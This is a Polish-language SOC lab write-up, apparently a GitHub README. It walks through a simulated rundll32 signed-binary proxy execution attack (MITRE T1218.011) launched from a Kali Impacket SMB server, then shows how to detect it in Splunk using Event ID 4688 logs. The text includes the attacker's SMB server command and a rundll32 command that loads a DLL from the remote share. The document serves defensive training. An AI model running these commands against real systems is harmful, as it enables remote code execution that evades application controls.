# Case Study SOC: Wykrywanie sieciowego ataku Rundll32 SMB 

## 1. Cel projektu
Celem tego projektu laboratoryjnego jest przeprowadzenie, analiza oraz wykrycie zaawansowanego ataku typu **Signed Binary Proxy Execution** z wykorzystaniem zaufanego, cyfrowo podpisanego narzędzia systemowego Windows – **Rundll32.exe** (technika sklasyfikowana w MITRE ATT&CK jako **T1218.011**). 

W scenariuszu zasymulowałem pełny wektor sieciowy (C2 / Attacker Node), w którym stacja robocza ofiary pobiera i próbuje wykonać zasób ze zdalnego serwera kontrolowanego przez napastnika. Projekt został zaprojektowany ze szczególnym naciskiem na **brak agenta Sysmon**. Oznacza to, że cała telemetria opiera się na **natywnych logach systemowych Windows (Windows Security Event Logs – Event ID 4688 z włączonym pełnym audytem linii poleceń)** zebranych i przeanalizowanych w systemie SIEM Splunk.

## 2. MITRE ATT&CK Mapowanie

| Tactic | Technique ID | Technique Name | Data Sources |
| :--- | :--- | :--- | :--- |
| **Defense Evasion / Execution** | T1218.011 | Signed Binary Proxy Execution: Rundll32 | Process: Process Creation, Command Line Execution |

### Wyjaśnienie taktyczne:
Atakujący wykorzystują legalny plik binarny systemu Windows (`rundll32.exe`) do załadowania zewnętrznej biblioteki DLL bezpośrednio z zasobu sieciowego (np. protokół SMB udostępniony przez maszynę Kali Linux). Ponieważ `rundll32.exe` jest podpisany cyfrowo przez Microsoft, mechanizmy oparte na reputacji plików zazwyczaj nie blokują jego uruchomienia. Pozwala to na ominięcie restrykcji kontroli aplikacji oraz ukrycie złośliwej aktywności pod płaszczykiem standardowego ruchu operacyjnego.

## 3. Metodologia ataku

### Krok 1: Przygotowanie środowiska Windows (Audyt linii poleceń)
Aby zarejestrować pełną ścieżkę sieciową oraz argumenty przekazane do procesu bez obecności Sysmona, musimy upewnić się, że w systemie Windows włączony jest audyt tworzenia procesów.

* **Komenda (PowerShell jako Administrator na Windows 10):**
  ```
  auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable

### Krok 2: Uruchomienie węzła atakującego na Kali Linux (Serwer SMB)
Atakujący na maszynie Kali Linux przygotowuje folder roboczy oraz uruchamia serwer SMB za pomocą pakietu Impacket, udostępniając zasób w sieci lokalnej.

<img width="675" height="533" alt="1" src="https://github.com/user-attachments/assets/0ffa0ccb-837f-46cc-9f97-19debbf36619" />

* **Komenda (Kali Linux):**
  ```
  sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py share /tmp/smbFolder -smb2support ``` 

### Krok 3: Egzekucja ataku sieciowego z poziomu Windows 10
Na stacji roboczej ofiary uruchomiłem wiersz poleceń (cmd.exe), wywołując rundll32.exe i wskazując ścieżkę UNC prowadzącą bezpośrednio do maszyny Kali Linux oraz eksportowaną funkcję biblioteki.

<img width="535" height="285" alt="2" src="https://github.com/user-attachments/assets/83854c9a-ac3d-4ec9-8c9e-5b19860b188a" />

* **Komenda (Windows - CMD):**
  ```
  rundll32.exe \\192.168.0.107\share\malicious.dll,EntryPoint

## 4. Analiza logów (Perspektywa braku Sysmona)
W środowisku pozbawionym agenta Sysmon analityk SOC weryfikuje zdarzenie w Windows Security Event Log (Event ID 4688) przesłanym do Splunk.

Na co patrzeć w strumieniu logów / JSONie:
*   EventID / EventCode:```4688``` (Utworzono nowy proces).
*   Nazwa nowego procesu: ```C:\Windows\System32\rundll32.exe```
*   Nazwa procesu twórcy (Parent): ```C:\Windows\System32\cmd.exe```
*   Wiersz polecenia (CommandLine): Kluczowy wskaźnik (IOC) – zawiera adres IP serwera atakującego oraz odwołanie do protokołu SMB (```\\192.168.0.107\share\...```).
  
Przykładowy JSON z logu Splunka:
{
  "EventCode": "4688",
  "ComputerName": "DESKTOP-UR3OJVV",
  "NewProcessName": "C:\\Windows\\System32\\rundll32.exe",
  "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
  "CommandLine": "rundll32.exe \\\\192.168.0.107\\share\\malicious.dll,EntryPoint"
}
